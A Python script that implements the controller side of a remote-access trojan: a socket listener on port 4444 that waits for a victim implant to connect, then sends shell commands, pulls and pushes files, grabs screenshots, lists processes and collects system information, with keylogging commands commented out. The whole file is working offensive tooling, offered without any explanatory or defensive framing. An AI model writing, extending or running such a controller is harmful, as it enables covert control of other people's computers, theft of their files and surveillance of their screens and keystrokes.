import socket
import threading

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting For Incoming Connections")
        self.connection, address = self.listener.accept()
        print("[+] Got A Connection From " + str(address))

    def execute_remotely(self, command):
        command_bytes = ' '.join(command).encode()
        self.connection.send(command_bytes)
        return self.connection.recv(1024).decode()

    def upload_file(self, filename):
        with open(filename, 'rb') as file:
            data = file.read()
            size = len(data)
            size_bytes = str(size).encode()
            self.connection.send(size_bytes)
            ack = self.connection.recv(1024).decode()
            if ack == 'ACK':
                self.connection.send(data)

    def download_file(self, filename):
        size_bytes = self.connection.recv(1024).decode()
        if size_bytes.isdigit():
            size = int(size_bytes)
            ack = 'ACK'.encode()
            self.connection.send(ack)
            data = b''
            while len(data) < size:
                chunk = self.connection.recv(4096)
                data += chunk
                if not chunk:
                    break
            with open(filename, 'wb') as file:
                file.write(data)

    def change_directory(self, path):
        command = ['cd', path]
        result = self.execute_remotely(command)
        return result

    def handle_command(self, command_list):
        if command_list[0] == "upload":
            filename = command_list[1]
            upload_thread = threading.Thread(target=self.upload_file, args=(filename,))
            upload_thread.start()
        elif command_list[0] == "download":
            filename = command_list[1]
            download_thread = threading.Thread(target=self.download_file, args=(filename,))
            download_thread.start()
        elif command_list[0] == "cd":
            path = ' '.join(command_list[1:])
            result = self.change_directory(path) 
            print(result)
        #elif command_list[0] == "start_keylog":
        #    self.connection.send(b"start_keylog")
        #    print(self.connection.recv(1024).decode())
        #elif command_list[0] == "stop_keylog":
        #    self.connection.send(b"stop_keylog")
        #    print(self.connection.recv(1024).decode())
        elif command_list[0] == "screenshot":
            self.connection.send(b"screenshot")
            with open("screenshot_received.png", "wb") as file:
                file.write(self.connection.recv(4096))
            print("Screenshot received.")
        elif command_list[0] == "processes":
            self.connection.send(b"processes")
            print(self.connection.recv(1024).decode())
        elif command_list[0] == "info":
            self.connection.send(b"info")
            print(self.connection.recv(1024).decode())

    def run(self):
        while True:
            command = input(">> ")
            command_list = command.split(" ")
            if command_list[0] == "exit":
                self.connection.send(b"exit")
                self.connection.close()
                break
            else:
                self.handle_command(command_list)

# Usage
my_listener = Listener("192.168.56.1", 4444)  # Replace with the correct IP and port
my_listener.run()



